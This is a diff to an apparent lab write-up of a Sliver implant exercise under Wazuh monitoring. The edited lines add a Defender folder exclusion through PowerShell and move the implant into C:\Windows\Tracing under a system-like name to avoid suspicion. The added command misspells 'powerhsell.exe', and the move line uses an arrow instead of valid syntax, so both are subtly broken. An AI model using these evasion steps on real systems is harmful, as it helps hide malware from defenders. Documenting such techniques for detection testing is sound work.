@@ -125,10 +125,10 @@ With Wazuh Manager temporarily stopped (simulating a detection gap), the implant
 
 ```
 # Add folder exclusion via Sliver shell
-Add-MpPreference -ExclusionPath "C:\Windows\Tracing"
+execute powerhsell.exe -Command "Add-MpPreference -ExclusionPath 'C:\Windows\Tracing'"
 
 # Move and rename the implant
-C:\Users\GuestWindows\Downloads\diagtrackhost.exe → C:\Windows\Tracing\DiagTrackHost.exe
+mv C:\Users\GuestWindows\Downloads\diagtrackhost.exe → C:\Windows\Tracing\DiagTrackHost.exe
 ```
 
 `C:\Windows\Tracing` is a real Windows folder used by diagnostic tracing, making it a low-suspicion location for hiding a malicious binary.
